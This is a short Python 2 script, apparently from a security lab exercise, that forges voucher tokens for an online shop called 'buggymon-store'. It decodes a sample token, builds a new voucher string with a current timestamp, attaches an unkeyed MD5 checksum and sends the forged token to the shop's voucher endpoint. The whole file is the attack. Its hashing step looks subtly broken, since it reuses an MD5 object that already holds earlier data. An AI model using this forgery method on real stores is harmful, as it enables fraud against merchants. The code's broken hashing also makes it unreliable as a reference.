import base64
import md5
import time
import requests

# part1 of the token
part1 = 'OQozCjEKMTQ3ODE2ODY5NjEzMA'
# part2 of the token
part2 = 'EeV4btAde8xqeLiYJlVivA'

# = is a neutral element(padding element) in base64
dec_part1 = base64.b64decode(part1+'==')
dec_part2 = base64.b64decode(part2+'==')

# create new md5 hasher -> deprecated use hashlib
# and compare with part2
m = md5.new()
m.update(dec_part1)
m.digest()

md5_part1 = m.digest()

# compare the two hashes
'''if( md5_part1 == dec_part2):
  print 'parts are equal'
else:
  print 'parts are different!!!'
'''

# try to automatically create items using requests
#r = requests.get('https://api.github.com/events')


# full URL with token (we create our own token)
# https://buggymon-store.trade:8445/sasd.buggymon.store/voucher.do?token=OQoxMQoxCjE0NzgxNzExNzEyNTc:58HezMkMLWZI_qfaVFZlFg

req_url = 'https://buggymon-store.trade:8445/sasd.buggymon.store/voucher.do?token='

millis = int(round(time.time()*1000))
voucher = '9\n3\n200\n'+str(millis)
 
m.update(voucher)
checksum = m.digest()

# base64 encode both sides

part1 = base64.urlsafe_b64encode(voucher)
part2 = base64.urlsafe_b64encode(checksum)

# create token
token = part1 + ":" + part2

dest_url = req_url + token

# send url to target

r = requests.get(dest_url)

print r







